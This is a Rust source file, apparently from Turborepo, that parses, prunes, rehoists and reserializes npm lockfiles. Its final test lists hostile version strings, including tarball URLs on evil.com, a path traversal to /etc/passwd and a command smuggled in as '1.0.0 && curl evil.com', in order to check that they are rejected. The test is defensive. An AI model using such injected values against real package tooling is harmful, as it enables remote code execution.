use std::{any::Any, collections::HashMap};

use semver::Version;
use serde::{Deserialize, Serialize, ser::SerializeMap};
use serde_json::Value;

use super::{Error, Lockfile, Package};

type Map<K, V> = std::collections::BTreeMap<K, V>;

// we change graph traversal now
// resolve_package should only be used now for converting initial contents
// of workspace package.json into a set of node ids
#[derive(Debug, Default, Deserialize)]
pub struct NpmLockfile {
    #[serde(rename = "lockfileVersion")]
    lockfile_version: i32,
    packages: HashMap<String, NpmPackage>,
    // We parse this so it doesn't end up in 'other' and we don't need to worry
    // about accidentally serializing it.
    #[serde(skip_serializing, default)]
    dependencies: Map<String, Value>,
    // We want to reserialize any additional fields, but we don't use them
    // we keep them as raw values to avoid describing the correct schema.
    #[serde(flatten)]
    other: Map<String, Value>,
}

impl Serialize for NpmLockfile {
    fn serialize<S: serde::Serializer>(&self, serializer: S) -> Result<S::Ok, S::Error> {
        // Sort packages keys for deterministic output matching npm's sorted
        // lockfile format.
        let mut sorted_packages: Vec<_> = self.packages.iter().collect();
        sorted_packages.sort_unstable_by(|(a, _), (b, _)| a.cmp(b));

        let field_count = 2 + self.other.len(); // lockfileVersion + packages + flattened other fields
        let mut map = serializer.serialize_map(Some(field_count))?;
        map.serialize_entry("lockfileVersion", &self.lockfile_version)?;

        // Serialize sorted packages as a JSON object
        map.serialize_entry("packages", &SortedPackages(&sorted_packages))?;

        for (k, v) in &self.other {
            map.serialize_entry(k, v)?;
        }
        map.end()
    }
}

struct SortedPackages<'a>(&'a [(&'a String, &'a NpmPackage)]);

impl Serialize for SortedPackages<'_> {
    fn serialize<S: serde::Serializer>(&self, serializer: S) -> Result<S::Ok, S::Error> {
        let mut map = serializer.serialize_map(Some(self.0.len()))?;
        for (k, v) in self.0 {
            map.serialize_entry(k, v)?;
        }
        map.end()
    }
}

#[derive(Debug, Serialize, Deserialize, Clone)]
#[serde(rename_all = "camelCase")]
struct NpmPackage {
    #[serde(default, skip_serializing_if = "Option::is_none")]
    version: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    resolved: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    integrity: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    name: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    license: Option<Value>,
    #[serde(default, skip_serializing_if = "std::ops::Not::not")]
    dev: bool,
    #[serde(default, skip_serializing_if = "std::ops::Not::not")]
    optional: bool,
    #[serde(default, skip_serializing_if = "std::ops::Not::not")]
    peer: bool,
    #[serde(default, skip_serializing_if = "std::ops::Not::not")]
    link: bool,
    #[serde(default, skip_serializing_if = "std::ops::Not::not")]
    has_install_script: bool,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    deprecated: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    bin: Option<Value>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    engines: Option<Value>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    os: Option<Value>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    cpu: Option<Value>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    funding: Option<Value>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    workspaces: Option<Value>,
    #[serde(default, skip_serializing_if = "Map::is_empty")]
    dependencies: Map<String, String>,
    #[serde(default, skip_serializing_if = "Map::is_empty")]
    dev_dependencies: Map<String, String>,
    #[serde(default, skip_serializing_if = "Map::is_empty")]
    peer_dependencies: Map<String, String>,
    #[serde(default, skip_serializing_if = "Map::is_empty")]
    optional_dependencies: Map<String, String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    peer_dependencies_meta: Option<Value>,
    // Fallback for any fields not explicitly enumerated above. Using flatten
    // here is still correct — but the vast majority of packages will have an
    // empty `other` because all common fields are now enumerated, so the
    // flatten overhead is minimal.
    #[serde(flatten)]
    other: Map<String, Value>,
}

impl Lockfile for NpmLockfile {
    #[tracing::instrument(skip(self, _version))]
    fn resolve_package(
        &self,
        workspace_path: &str,
        name: &str,
        _version: &str,
    ) -> Result<Option<Package>, Error> {
        if !self.packages.contains_key(workspace_path) {
            return Err(Error::MissingWorkspace(workspace_path.to_string()));
        }

        let possible_keys = [
            // AllDependencies will return a key to avoid choosing the incorrect transitive dep
            name.to_string(),
            // If we didn't find the entry just using name, then this is an initial call to
            // ResolvePackage based on information coming from internal packages'
            // package.json First we check if the workspace uses a nested version of
            // the package
            format!("{workspace_path}/node_modules/{name}"),
            // Next we check for a top level version of the package
            format!("node_modules/{name}"),
        ];
        possible_keys
            .into_iter()
            .filter_map(|key| {
                self.packages.get(&key).map(|pkg| {
                    let version = pkg.version.clone().unwrap_or_default();
                    Ok(Package { key, version })
                })
            })
            .next()
            .transpose()
    }

    #[tracing::instrument(skip(self))]
    fn all_dependencies(
        &self,
        key: &str,
    ) -> Result<Option<std::borrow::Cow<'_, HashMap<String, String>>>, Error> {
        let Some(pkg) = self.packages.get(key) else {
            return Ok(None);
        };

        let mut deps = HashMap::new();
        let mut buf = String::new();
        for name in pkg.dep_keys() {
            if let Some((resolved_key, version)) = self.find_dep_in_lockfile(key, name, &mut buf)? {
                deps.insert(resolved_key, version);
            }
        }
        Ok(Some(std::borrow::Cow::Owned(deps)))
    }

    fn subgraph(
        &self,
        workspace_packages: &[String],
        packages: &[String],
    ) -> Result<Box<dyn Lockfile>, Error> {
        let mut pruned_packages = HashMap::new();
        for pkg_key in packages {
            let pkg = self.get_package(pkg_key)?;
            pruned_packages.insert(pkg_key.to_string(), pkg.clone());
        }
        if let Some(root) = self.packages.get("") {
            pruned_packages.insert("".into(), root.clone());
        }
        for workspace in workspace_packages {
            let pkg = self.get_package(workspace)?;
            pruned_packages.insert(workspace.to_string(), pkg.clone());

            for (key, entry) in &self.packages {
                if entry.resolved.as_deref() == Some(workspace.as_str()) {
                    pruned_packages.insert(key.clone(), entry.clone());
                    break;
                }
            }
        }

        // After pruning, a package nested under a workspace's node_modules
        // (e.g. `apps/web/node_modules/next@15`) may exist without a
        // corresponding hoisted version (`node_modules/next`) if the hoisted
        // version was only needed by a now-pruned workspace and the transitive
        // closure didn't include it. Promote the nested version to the hoisted
        // position so npm ci sees a consistent tree.
        // See https://github.com/vercel/turborepo/issues/10985
        let ws_set: std::collections::HashSet<&str> =
            workspace_packages.iter().map(|s| s.as_str()).collect();
        let requested: std::collections::HashSet<&str> =
            packages.iter().map(|s| s.as_str()).collect();
        Self::rehoist_packages(&mut pruned_packages, &ws_set, &requested);

        Ok(Box::new(Self {
            lockfile_version: self.lockfile_version,
            packages: pruned_packages,
            dependencies: Map::default(),
            other: self.other.clone(),
        }))
    }

    fn encode(&self) -> Result<Vec<u8>, crate::Error> {
        Ok(serde_json::to_vec_pretty(&self)?)
    }

    fn global_change(&self, other: &dyn Lockfile) -> bool {
        let any_other = other as &dyn Any;
        if let Some(other) = any_other.downcast_ref::<Self>() {
            self.lockfile_version != other.lockfile_version
                || self.other.get("requires") != other.other.get("requires")
        } else {
            true
        }
    }

    fn turbo_version(&self) -> Option<String> {
        let turbo_entry = self.packages.get("node_modules/turbo")?;
        let version = turbo_entry.version.as_ref()?;
        Version::parse(version).ok()?;
        Some(version.clone())
    }

    fn human_name(&self, package: &Package) -> Option<String> {
        let npm_package = self.packages.get(&package.key)?;
        let version = npm_package.version.as_deref()?;
        let name = package.key.split("node_modules/").last()?;
        Some(format!("{name}@{version}"))
    }
}

impl NpmLockfile {
    pub fn load(content: &[u8]) -> Result<Self, Error> {
        let lockfile: NpmLockfile = serde_json::from_slice(content)?;

        // We don't support lockfiles without 'packages' as older versions
        // required reading through the contents of node_modules in order
        // to resolve dependencies.
        // See https://github.com/npm/cli/blob/9609e9eed87c735f0319ac0af265f4d406cbf800/workspaces/arborist/lib/shrinkwrap.js#L674
        if lockfile.lockfile_version <= 1
            || (lockfile.packages.is_empty() && !lockfile.dependencies.is_empty())
        {
            Err(Error::UnsupportedNpmVersion)
        } else {
            Ok(lockfile)
        }
    }

    fn get_package(&self, package: impl AsRef<str>) -> Result<&NpmPackage, Error> {
        let pkg_str = package.as_ref();
        self.packages
            .get(pkg_str)
            .ok_or_else(|| Error::MissingPackage(pkg_str.to_string()))
    }

    /// Promotes workspace-nested packages to the hoisted position when the
    /// hoisted slot is either empty or occupied by a version that no
    /// workspace's transitive closure actually requested.
    fn rehoist_packages(
        pruned: &mut HashMap<String, NpmPackage>,
        workspace_packages: &std::collections::HashSet<&str>,
        requested: &std::collections::HashSet<&str>,
    ) {
        let mut to_rehoist: Vec<(String, String)> = Vec::new();

        for key in pruned.keys() {
            let Some(idx) = key.find("/node_modules/") else {
                continue;
            };
            let prefix = &key[..idx];
            if prefix.contains("node_modules/") || !workspace_packages.contains(prefix) {
                continue;
            }
            let pkg_name = &key[idx + "/node_modules/".len()..];
            if pkg_name.is_empty() {
                continue;
            }
            let hoisted_key = format!("node_modules/{pkg_name}");

            // If the hoisted key was explicitly requested by a workspace's
            // transitive closure, another workspace genuinely needs that
            // version — don't replace it.
            if requested.contains(hoisted_key.as_str()) {
                continue;
            }

            // Either the hoisted slot is empty or it holds a version that
            // wasn't requested (it was pulled in only via subgraph's
            // workspace entry insertion). Safe to replace.
            to_rehoist.push((key.clone(), hoisted_key));
        }

        for (nested_key, hoisted_key) in to_rehoist {
            // Remove old hoisted entry and its sub-deps.
            let old_prefix = format!("{hoisted_key}/");
            let old_sub: Vec<String> = pruned
                .keys()
                .filter(|k| k.starts_with(&old_prefix))
                .cloned()
                .collect();
            for k in old_sub {
                pruned.remove(&k);
            }
            pruned.remove(&hoisted_key);

            // Promote nested entry.
            if let Some(pkg) = pruned.remove(&nested_key) {
                pruned.insert(hoisted_key.clone(), pkg);
            }

            // Relocate sub-deps from nested path to hoisted path.
            let nested_prefix = format!("{nested_key}/");
            let new_prefix = format!("{hoisted_key}/");
            let sub_keys: Vec<String> = pruned
                .keys()
                .filter(|k| k.starts_with(&nested_prefix))
                .cloned()
                .collect();
            for sub_key in sub_keys {
                if let Some(pkg) = pruned.remove(&sub_key) {
                    let new_key = format!("{new_prefix}{}", &sub_key[nested_prefix.len()..]);
                    pruned.insert(new_key, pkg);
                }
            }
        }
    }

    /// Resolve a dependency name by walking up the node_modules hierarchy,
    /// checking each candidate key in the packages map. Uses `buf` to avoid
    /// allocating a new String for each candidate.
    fn find_dep_in_lockfile(
        &self,
        key: &str,
        dep: &str,
        buf: &mut String,
    ) -> Result<Option<(String, String)>, Error> {
        // First candidate: nested directly under the current package
        buf.clear();
        buf.reserve(key.len() + "/node_modules/".len() + dep.len());
        buf.push_str(key);
        buf.push_str("/node_modules/");
        buf.push_str(dep);
        if let Some(result) = self.check_package_entry(buf)? {
            return Ok(Some(result));
        }

        // Walk up the node_modules hierarchy
        let mut curr = Some(key);
        while let Some(k) = curr {
            let parent = Self::npm_path_parent(k);
            buf.clear();
            if let Some(p) = parent {
                buf.reserve(p.len() + "node_modules/".len() + dep.len());
                buf.push_str(p);
            } else {
                buf.reserve("node_modules/".len() + dep.len());
            }
            buf.push_str("node_modules/");
            buf.push_str(dep);

            if let Some(result) = self.check_package_entry(buf)? {
                return Ok(Some(result));
            }
            curr = parent;
        }

        Ok(None)
    }

    fn check_package_entry(&self, candidate_key: &str) -> Result<Option<(String, String)>, Error> {
        let Some(entry) = self.packages.get(candidate_key) else {
            return Ok(None);
        };
        match entry.version.as_deref() {
            Some(version) => Ok(Some((candidate_key.to_owned(), version.to_owned()))),
            None if entry.resolved.is_some() => Ok(None),
            None => Err(Error::MissingVersion(candidate_key.to_owned())),
        }
    }

    #[cfg(test)]
    fn possible_npm_deps(key: &str, dep: &str) -> Vec<String> {
        let mut possible_deps = vec![format!("{key}/node_modules/{dep}")];

        let mut curr = Some(key);
        while let Some(key) = curr {
            let next = Self::npm_path_parent(key);
            possible_deps.push(format!("{}node_modules/{}", next.unwrap_or(""), dep));
            curr = next;
        }

        possible_deps
    }

    fn npm_path_parent(key: &str) -> Option<&str> {
        key.rsplit_once("node_modules/")
            .map(|(first, _)| first)
            .and_then(|parent| {
                if parent.is_empty() {
                    None
                } else {
                    Some(parent)
                }
            })
    }
}

impl NpmPackage {
    pub fn dep_keys(&self) -> impl Iterator<Item = &String> {
        self.dependencies
            .keys()
            .chain(self.dev_dependencies.keys())
            .chain(self.optional_dependencies.keys())
            .chain(self.peer_dependencies.keys())
    }
}

pub fn npm_subgraph(
    contents: &[u8],
    workspace_packages: &[String],
    packages: &[String],
) -> Result<Vec<u8>, Error> {
    let lockfile = NpmLockfile::load(contents)?;
    let pruned_lockfile = lockfile.subgraph(workspace_packages, packages)?;
    let new_contents = pruned_lockfile.encode()?;

    Ok(new_contents)
}

pub fn npm_global_change(prev_contents: &[u8], curr_contents: &[u8]) -> Result<bool, Error> {
    let prev_lockfile = NpmLockfile::load(prev_contents)?;
    let curr_lockfile = NpmLockfile::load(curr_contents)?;

    Ok(
        prev_lockfile.lockfile_version != curr_lockfile.lockfile_version
            || prev_lockfile.other.get("requires") != curr_lockfile.other.get("requires"),
    )
}
#[cfg(test)]
mod test {
    use super::*;

    #[test]
    fn test_npm_parent() {
        let tests = [
            ("apps/docs", None),
            ("apps/docs/node_modules/foo", Some("apps/docs/")),
            ("node_modules/foo", None),
            (
                "node_modules/foo/node_modules/bar",
                Some("node_modules/foo/"),
            ),
        ];

        for (key, parent) in &tests {
            assert_eq!(NpmLockfile::npm_path_parent(key), *parent);
        }
    }

    #[test]
    fn test_possible_npm_deps() {
        let tests = [
            (
                "node_modules/foo",
                "baz",
                vec!["node_modules/foo/node_modules/baz", "node_modules/baz"],
            ),
            (
                "node_modules/foo/node_modules/bar",
                "baz",
                vec![
                    "node_modules/foo/node_modules/bar/node_modules/baz",
                    "node_modules/foo/node_modules/baz",
                    "node_modules/baz",
                ],
            ),
            (
                "node_modules/foo1/node_modules/foo2/node_modules/foo3/node_modules/foo4",
                "bar",
                vec![
                    "node_modules/foo1/node_modules/foo2/node_modules/foo3/node_modules/foo4/\
                     node_modules/bar",
                    "node_modules/foo1/node_modules/foo2/node_modules/foo3/node_modules/bar",
                    "node_modules/foo1/node_modules/foo2/node_modules/bar",
                    "node_modules/foo1/node_modules/bar",
                    "node_modules/bar",
                ],
            ),
            (
                "apps/docs/node_modules/foo",
                "baz",
                vec![
                    "apps/docs/node_modules/foo/node_modules/baz",
                    "apps/docs/node_modules/baz",
                    "node_modules/baz",
                ],
            ),
        ];

        for (key, dep, expected) in &tests {
            assert_eq!(&NpmLockfile::possible_npm_deps(key, dep), expected);
        }
    }

    #[test]
    fn test_turbo_version_rejects_non_semver() {
        // Malicious version strings that could be used for RCE via npx should be
        // rejected
        let malicious_versions = [
            "file:./malicious.tgz",
            "https://evil.com/malicious.tgz",
            "http://evil.com/malicious.tgz",
            "git+https://github.com/evil/repo.git",
            "git://github.com/evil/repo.git",
            "../../../etc/passwd",
            "1.0.0 && curl evil.com",
        ];

        for malicious_version in malicious_versions {
            let json = format!(
                r#"{{
                    "lockfileVersion": 3,
                    "packages": {{
                        "": {{}},
                        "node_modules/turbo": {{
                            "version": "{}"
                        }}
                    }}
                }}"#,
                malicious_version
            );
            let lockfile = NpmLockfile::load(json.as_bytes()).unwrap();
            assert_eq!(
                lockfile.turbo_version(),
                None,
                "should reject malicious version: {}",
                malicious_version
            );
        }
    }
}
